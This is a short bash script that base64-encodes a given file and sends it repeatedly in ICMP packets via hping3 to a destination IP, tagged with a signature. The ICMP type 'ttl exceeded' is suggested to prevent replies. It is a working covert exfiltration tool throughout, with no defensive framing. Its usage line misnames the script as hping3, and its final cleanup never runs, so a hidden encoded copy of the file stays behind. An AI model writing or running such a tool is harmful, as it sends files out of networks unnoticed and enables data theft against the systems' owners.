#$1 - destination IP
#$2 - signature
#$3 - plain text file
#$4 - data frame size
#$5 - icmp type
#Option -C 11 is ttl exceeded preventing a reply
#Usage: hping3 [dest ip] [signature] [tx file] [data frame size] [icmp type]
while getopts h option
do
        case "${option}"
        in
                h) echo "
#\$1 - destination IP
#\$2 - signature
#\$3 - plain text file
#\$4 - data frame size (try 100)
#\$5 - icmp type (try 11 - ttl exceeded)
#Usage: hping3 [dest ip] [signature] [tx file] [data frame size] [icmp type]
"
exit;;
        esac
done
base64 -w 0 $3 > ./.target.base64
while true; do
        if hping3 $1 --icmp --sign $2 --file ./.target.base64 -d $4 -u -C $5 2>&1 | grep -q --line-buffered -m 1 EOF; then
         echo "EOF Reached"
         exit
        fi
done
rm ./.target.base64
